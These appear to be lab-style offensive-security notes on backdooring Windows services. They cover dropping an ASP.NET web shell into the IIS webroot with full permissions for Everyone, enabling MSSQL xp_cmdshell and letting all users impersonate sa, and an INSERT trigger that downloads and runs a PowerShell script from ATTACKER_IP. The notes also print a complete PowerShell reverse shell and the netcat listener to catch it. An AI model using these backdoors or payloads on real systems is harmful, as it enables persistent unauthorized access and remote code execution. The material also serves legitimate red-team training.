# Persisting through existing services

Any application where you have some degree of control on what gets executed can be backdoored in a similar way. 
The possibilities are endless!

## Using web shells

Download a web shell like 
[ASP.NET web shell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx). Transfer it to 
the target machine and move it into the webroot, which for IIS by default is the `C:\inetpub\wwwroot` directory.

    move shell.aspx C:\inetpub\wwwroot\

We can then run commands from the web server by going to the following URL:

    http://<IP target>/shell.aspx

Note: If you are getting a `Permission Denied` error while accessing the shell's URL, just grant everyone full 
permissions on the file to get it working. You can do so with 

    icacls shell.aspx /grant Everyone:F

Web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity 
in the web directories. Any change to a file in there will probably trigger an alert.

## Using MSSQL as a backdoor

There are many ways to plant backdoors in MSSQL Server installations, one of which is abusing triggers. 
Triggers in MSSQL allow for bind actions to be performed when specific events occur in the database. Those events can 
range from a user logging in up to data being inserted, updated or deleted from a given table.

`xp_cmdshell` is a stored procedure provided by default in any MSSQL installation. It allows for running commands 
directly in the system's console but comes disabled by default. To enable it, open 
`Microsoft SQL Server Management Studio 18`, from the start menu. When asked for authentication, use 
`Windows Authentication` (the default value), and you will be logged on with the credentials of the current Windows 
User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on the `New Query` button to open the query editor:


Run the following SQL sentences to enable the `Advanced Options` in the MSSQL configuration, and 
enable `xp_cmdshell`.

    sp_configure 'Show Advanced Options',1;
    RECONFIGURE;
    GO
    
    sp_configure 'xp_cmdshell',1;
    RECONFIGURE;
    GO

Next up is making sure that any website accessing the database can run `xp_cmdshell`. By default, only database 
users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted 
database user, we can grant privileges to all users to impersonate the sa user, which is the default database 
administrator:

    USE master
    
    GRANT IMPERSONATE ON LOGIN::sa to [Public];

Configuring a trigger starts by changing to the `HRDB` database:

    USE HRDB

The trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from 
a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made 
into the `Employees` table of the `HRDB` database:

    CREATE TRIGGER [sql_backdoor]
    ON HRDB.dbo.Employees 
    FOR INSERT AS
    
    EXECUTE AS LOGIN = 'sa'
    EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';

Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:

    $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
    
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    };
    
    $client.Close()

We will need to open two terminals to handle the connections involved in this exploit:

The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.

    python -m http.server

The second connection will be a reverse shell on port 4454 back to our attacker machine.

    nc -lvp 4454

Navigate to `http://IP target/` and insert an employee into the web application.
